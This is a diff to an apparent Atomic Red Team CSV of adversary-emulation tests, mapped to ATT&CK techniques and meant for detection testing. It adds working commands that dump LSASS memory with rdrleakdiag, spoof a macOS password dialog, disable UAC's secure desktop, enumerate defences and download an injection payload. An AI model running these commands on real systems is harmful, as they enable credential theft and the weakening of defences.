@@ -1379,7 +1379,16 @@ T1518.001,Software Discovery: Security Software Discovery,Security Software Disc
 
 when sucessfully executed, the test is going to display running processes, firewall configuration on network profiles
 and specific security software.
-",windows,,,"netsh.exe advfirewall  show allprofiles
+",windows,,,"netsh.exe advfirewall  show allprofiles 
+netsh.exe advfirewall firewall dump
+netsh.exe advfirewall show currentprofile
+netsh.exe advfirewall firewall show rule name=all
+netsh.exe firewall show state
+netsh.exe firewall show config
+sc query windefend
+powershell.exe /c ""Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }""
+powershell.exe /c ""Get-Service | where-object {$_.DisplayName -like '*sysm*'}""
+powershell.exe /c ""Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''""
 tasklist.exe
 tasklist.exe | findstr /i virus
 tasklist.exe | findstr /i cb
@@ -1400,6 +1409,7 @@ get-process | ?{$_.Description -like ""*defender*""}
 get-process | ?{$_.Description -like ""*cylance*""}
 get-process | ?{$_.Description -like ""*mc*""}
 get-process | ?{$_.ProcessName -like ""*mc*""}
+get-process | Where-Object { $_.ProcessName -eq ""Sysmon"" }
 ",powershell,,,,,,
 T1518.001,Software Discovery: Security Software Discovery,Security Software Discovery - ps (macOS),ba62ce11-e820-485f-9c17-6f3c857cd840,"Methods to identify Security Software on an endpoint
 when sucessfully executed, command shell  is going to display AV/Security software it is running.
@@ -1418,6 +1428,25 @@ T1518.001,Software Discovery: Security Software Discovery,Security Software Disc
 
 when sucessfully executed, the test is going to display installed AV software.
 ",windows,,,wmic.exe /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List,command_prompt,True,,,,,
+T1518.001,Software Discovery: Security Software Discovery,Security Software Discovery - AV Discovery via Get-CimInstance and Get-WmiObject cmdlets,015cd268-996e-4c32-8347-94c80c6286ee,"Discovery of installed antivirus products via Get-CimInstance and Get-WmiObject cmdlets of powershell.
+
+when sucessfully executed, information about installed AV software is displayed..
+",windows,,,"powershell Get-CimInstance -Namespace root/securityCenter2 -classname antivirusproduct
+powershell Get-WmiObject -Namespace root\securitycenter2 -Class antivirusproduct
+",command_prompt,True,,,,,
+T1518.001,Software Discovery: Security Software Discovery,Security Software Discovery - Windows Defender Enumeration,d3415a0e-66ef-429b-acf4-a768876954f6,"Windows Defender Enumeration via different built-in windows native tools.
+when sucessfully executed, information about windows defender is displayed.
+",windows,,,"Get-Service WinDefend #check the service state of Windows Defender
+Get-MpComputerStatus #provides the current status of security solution elements, including Anti-Spyware, Antivirus, LoavProtection, Real-time protection, etc
+Get-MpThreat #threats details that have been detected using MS Defender
+",powershell,True,,,,,
+T1518.001,Software Discovery: Security Software Discovery,Security Software Discovery - Windows Firewall Enumeration,9dca5a1d-f78c-4a8d-accb-d6de67cfed6b,"Enumerates windows firewall to retrieves firewall rules from the target computer.
+
+when sucessfully executed, details of windows firewall is displayed.
+",windows,,,"Get-NetFirewallProfile | Format-Table Name, Enabled
+Get-NetFirewallSetting
+Get-NetFirewallRule | select DisplayName, Enabled, Description
+",powershell,True,,,,,
 T1552.002,Unsecured Credentials: Credentials in Registry,Enumeration for Credentials in Registry,b6ec082c-7384-46b3-a111-9a9b8b14e5e7,"Queries to enumerate for credentials in the Registry. Upon execution, any registry key containing the word ""password"" will be displayed.
 ",windows,,,"reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
@@ -2178,6 +2207,25 @@ input_arguments.output_file.type: path
 input_arguments.output_file.default: C:\Windows\Temp\lsass-xordump.t1003.001.dmp
 
 "
+T1003.001,OS Credential Dumping: LSASS Memory,Dump LSASS.exe using lolbin rdrleakdiag.exe,47a539d1-61b9-4364-bf49-a68bc2a95ef0,"The memory of lsass.exe is often dumped for offline credential theft attacks. 
+This can be achieved with lolbin rdrleakdiag.exe. 
+
+Upon successful execution, you should see the following files created, $env:TEMP\minidump_<PID>.dmp and  $env:TEMP\results_<PID>.hlk.
+",windows,,,"if (Test-Path -Path ""$env:SystemRoot\System32\rdrleakdiag.exe"") {
+      $binary_path = ""$env:SystemRoot\System32\rdrleakdiag.exe""
+  } elseif (Test-Path -Path ""$env:SystemRoot\SysWOW64\rdrleakdiag.exe"") {
+      $binary_path = ""$env:SystemRoot\SysWOW64\rdrleakdiag.exe""
+  } else {
+      $binary_path = ""File not found""
+      exit 1
+  }
+$lsass_pid = get-process lsass |select -expand id
+if (-not (Test-Path -Path""$env:TEMP\t1003.001-13-rdrleakdiag"")) {New-Item -ItemType Directory -Path $env:TEMP\t1003.001-13-rdrleakdiag -Force} 
+write-host $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
+& $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
+Write-Host ""Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\t1003.001-13-rdrleakdiag directory.""
+",powershell,True,,"Remove-Item $env:TEMP\t1003.001-13-rdrleakdiag -Recurse -Force -ErrorAction Ignore
+",,,
 T1610,Deploy a container,Deploy Docker container,59aa6f26-7620-417e-9318-589e0fb7a372,"Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime. They can do this using docker create and docker start commands. Kinsing & Doki was exploited using this technique. 
 ",containers,,,"docker build -t t1610 $PathtoAtomicsFolder/T1610/src/
 docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh
@@ -3701,6 +3749,34 @@ input_arguments.domain.type: string
 input_arguments.domain.default: google.com
 
 "
+T1055.011,Process Injection: Extra Window Memory Injection,Process Injection via Extra Window Memory (EWM) x64 executable,93ca40d2-336c-446d-bcef-87f14d438018,Hooks functions of main process to inject a payload via Extra Window Memory (EWM) injection technique,windows,,,#{exe_binary},powershell,False,,Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force,powershell,"dependencies.0.description: T1055.011x64.exe and payload must exist on disk at specified location (#{exe_binary} and #{payload_file})
+dependencies.0.prereq_command: if (Test-Path #{exe_binary}) {exit 0} else {exit 1}
+dependencies.0.get_prereq_command: New-Item -Type Directory (split-path #{exe_binary}) -ErrorAction ignore | Out-Null
+Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_#{arch}.exe"" -OutFile ""#{exe_binary}"" -UseBasicParsing
+Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/payload.exe_#{arch}.bin"" -OutFile ""#{payload_file}"" -UseBasicParsing
+","input_arguments.arch.description: Architecture of payload
+
+input_arguments.arch.type: string
+
+input_arguments.arch.default: x64
+
+input_arguments.arch.choices.0: x64
+
+input_arguments.arch.choices.1: x86
+
+input_arguments.exe_binary.description: PE binary for EWM injection
+
+input_arguments.exe_binary.type: path
+
+input_arguments.exe_binary.default: PathToAtomicsFolder\T1055.011\bin\T1055.011_#{arch}.exe
+
+input_arguments.payload_file.description: raw payload to inject
+
+input_arguments.payload_file.type: path
+
+input_arguments.payload_file.default: PathToAtomicsFolder\T1055.011\bin\payload.exe_#{arch}.bin
+
+"
 T1134.002,Create Process with Token,Access Token Manipulation,dbf4f5a9-b8e0-46a3-9841-9ad71247239e,"This Action demonstrates how an access token for a specific program can spawn another program under a different owner. 
 Adversaries can leverage access tokens to run programs under a different user not only to achieve privilege escalation but also to evade detection by blending in with normal user activity. 
 This Action will query all processes and list the process name and owner.It will then make a copy of an existing token to create a new instance of cmd.exe
@@ -5105,7 +5181,7 @@ start-process ""$env:allusersprofile\cmd.exe""
 sleep -s 5 
 stop-process -name ""cmd"" | out-null",powershell,,,"remove-item ""$env:allusersprofile\cmd.exe"" -force -erroraction silentlycontinue",,,
 T1036,Masquerading,Malware Masquerading and Execution from Zip File,4449c89b-ec82-43a4-89c1-91e2f1abeecc,"When the file is unzipped and the README.cmd file opened, it executes and changes the .pdf to .dll and executes the dll. This is a BazaLoader technique [as reported here](https://twitter.com/ffforward/status/1481672378639912960)",windows,,,"Expand-Archive -Path ""PathToAtomicsFolder\..\ExternalPayloads\T1036.zip"" -DestinationPath ""$env:userprofile\Downloads\T1036"" -Force
-cd ""$env:userprofile\Downloadss\T1036""
+cd ""$env:userprofile\Downloads\T1036""
 cmd /c ""$env:userprofile\Downloads\T1036\README.cmd"" >$null 2>$null",powershell,,,"taskkill /IM Calculator.exe /f >$null 2>$null
 Remove-Item ""$env:userprofile\Downloads\T1036"" -recurse -ErrorAction Ignore",,"dependencies.0.description: Zip file must be present.
 dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\T1036.zip"") {exit 0} else {exit 1}
@@ -5475,7 +5551,7 @@ input_arguments.input_file.type: path
 input_arguments.input_file.default: PathToAtomicsFolder\T1059.003\src\t1059.003_cmd.cmd
 
 "
-T1059.003,Command and Scripting Interpreter: Windows Command Shell,Command prompt writing script to file then executes it,,"    Simulate DarkGate malware's second stage by writing a VBscript to disk directly from the command prompt then executing it.
+T1059.003,Command and Scripting Interpreter: Windows Command Shell,Command prompt writing script to file then executes it,00682c9f-7df4-4df8-950b-6dcaaa3ad9af,"    Simulate DarkGate malware's second stage by writing a VBscript to disk directly from the command prompt then executing it.
     The script will execute 'whoami' then exit.",windows,,," c:\windows\system32\cmd.exe /c cd /d #{script_path} & echo Set objShell = CreateObject(""WScript.Shell""):Set objExec = objShell.Exec(""whoami""):Set objExec = Nothing:Set objShell = Nothing > #{script_name}.vbs & #{script_name}.vbs",command_prompt,True,,"del ""#{script_name}.vbs"" >nul 2>&1",,,"input_arguments.script_path.description: Path in which the script will be written.
 
 input_arguments.script_path.type: path
@@ -6592,7 +6668,7 @@ input_arguments.target.default: $env:COMPUTERNAME
 "
 T1027.004,Obfuscated Files or Information: Compile After Delivery,Compile After Delivery using csc.exe,ffcdbd6a-b0e8-487d-927a-09127fe9a206,"Compile C# code using csc.exe binary used by .NET
 Upon execution an exe named T1027.004.exe will be placed in the temp folder
-",windows,,,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:#{output_file} #{input_file}
+",windows,,,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:#{output_file} ""#{input_file}""
 ",command_prompt,,,"del #{output_file} >nul 2>&1
 ",powershell,"dependencies.0.description: C# file must exist on disk at specified location (#{input_file})
 
@@ -12677,10 +12753,9 @@ input_arguments.registry_entry_storage.default: Debug
 
 "
 T1027,Obfuscated Files or Information,Execution from Compressed File,f8c8a909-5f29-49ac-9244-413936ce6d1f,"Mimic execution of compressed executable. When successfully executed, calculator.exe will open.
-",windows,,,"""%temp%\temp_T1027.zip\T1027.exe""
+",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\T1027.exe""
 ",command_prompt,,,"taskkill /f /im calculator.exe >nul 2>nul
-rmdir /S /Q %temp%\temp_T1027.zip >nul 2>nul
-del /Q ""%temp%\T1027.zip"" >nul 2>nul
+taskkill /f /im CalculatorApp.exe >nul 2>nul
 ",powershell,"dependencies.0.description: T1027.exe must exist on disk at PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\T1027.exe
 
 dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\T1027.exe"") {exit 0} else {exit 1}
@@ -12773,7 +12848,7 @@ T1027,Obfuscated Files or Information,Snake Malware Encrypted crmlog file,7e47ee
 ",powershell,True,,"$fileNameToDelete = '04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog'; $filePathToDelete = ""$env:windir\registration\""; $fullPathToDelete = Join-Path $filePathToDelete $fileNameToDelete; if (Test-Path $fullPathToDelete) { Remove-Item -Path $fullPathToDelete -Force; Write-Host ""File deleted: $fullPathToDelete"" } else { Write-Host ""File not found: $fullPathToDelete"" }
 ",,,
 T1027,Obfuscated Files or Information,Execution from Compressed JScript File,fad04df1-5229-4185-b016-fb6010cd87ac,"Mimic execution of compressed JavaScript file. When successfully executed, calculator.exe will open. This test is meant to help emulate Gootloader as per https://redcanary.com/blog/gootloader/
-",windows,,,"""%temp%\temp_T1027js.zip\T1027js.js""
+",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js""
 ",command_prompt,,,"taskkill /f /im calculator.exe >nul 2>nul
 ",powershell,"dependencies.0.description: T1027.js must exist on disk at PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js
 
@@ -12788,7 +12863,7 @@ Expand-Archive -path ""PathToAtomicsFolder\..\ExternalPayloads\T1027js.zip"" -De
 
 input_arguments.url_path.type: url
 
-input_arguments.url_path.default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027js.zip
+input_arguments.url_path.default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/t1027js.zip
 
 "
 T1562.008,Impair Defenses: Disable Cloud Logs,AWS - CloudTrail Changes,9c10dc6b-20bd-403a-8e67-50ef7d07ed4e,"Creates a new cloudTrail in AWS, Upon successful creation it will Update,Stop and Delete the cloudTrail
@@ -13980,6 +14055,11 @@ $cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]
 # Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.
 write-warning $cred.GetNetworkCredential().Password
 ",powershell,,,,,,
+T1056.002,Input Capture: GUI Input Capture,AppleScript - Spoofing a credential prompt using osascript,b7037b89-947a-427a-ba29-e7e9f09bc045,"Prompt user for password without requiring permissions to send Apple events to System Settings.
+https://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/
+",macos,,,"PWD_SPOOF=$(osascript -e 'display dialog ""To perform a security update MacOS needs your passphrase."" with title ""MacOS Security Update"" default answer """" with icon stop with hidden answer')
+echo $PWD_SPOOF
+",bash,,,,,,
 T1559.002,Inter-Process Communication: Dynamic Data Exchange,Execute Commands,f592ba2a-e9e8-4d62-a459-ef63abd819fd,"Executes commands via DDE using Microsfot Word
 ",windows,,,,manual,,"Open Microsoft Word
 
@@ -19006,7 +19086,7 @@ T1021.001,Remote Services: Remote Desktop Protocol,Changing RDP Port to Non Stan
 netsh advfirewall firewall add rule name=""RDPPORTLatest-TCP-In"" dir=in action=allow protocol=TCP localport=#{NEW_Remote_Port}
 ",command_prompt,True,,"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v PortNumber /t REG_DWORD /d #{OLD_Remote_Port} /f >nul 2>&1
 netsh advfirewall firewall delete rule name=""RDPPORTLatest-TCP-In"" >nul 2>&1
-net stop TermService >nul 2>&1
+net stop TermService /y >nul 2>&1
 net start TermService >nul 2>&1
 ",,,"input_arguments.OLD_Remote_Port.description: Default RDP Listening Port
 
@@ -23481,6 +23561,11 @@ input_arguments.commandtorun.type: string
 input_arguments.commandtorun.default: C:\Windows\System32\cmd.exe /c start cmd.exe
 
 "
+T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,Disable UAC - Switch to the secure desktop when prompting for elevation via registry key,85f3a526-4cfa-4fe7-98c1-dea99be025c7,"User Account Control (UAC) is a security mechanism for limiting the elevation of privileges, including administrative accounts, unless authorized. 
+This setting ensures that the elevation prompt is only used in secure desktop mode.
+Disable User Account Conrol (UAC) for secure desktop by setting the registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop to 0.
+",windows,,,Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force,powershell,True,,"Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 1 -Type Dword -Force
+",,,
 T1222.002,File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification,chmod - Change file or folder mode (numeric mode),34ca1464-de9d-40c6-8c77-690adf36a135,"Changes a file or folder's permissions using chmod and a specified numeric mode.
 ",macos,linux,,"chmod #{numeric_mode} #{file_or_folder}
 ",bash,,,,,,"input_arguments.numeric_mode.description: Specified numeric mode value
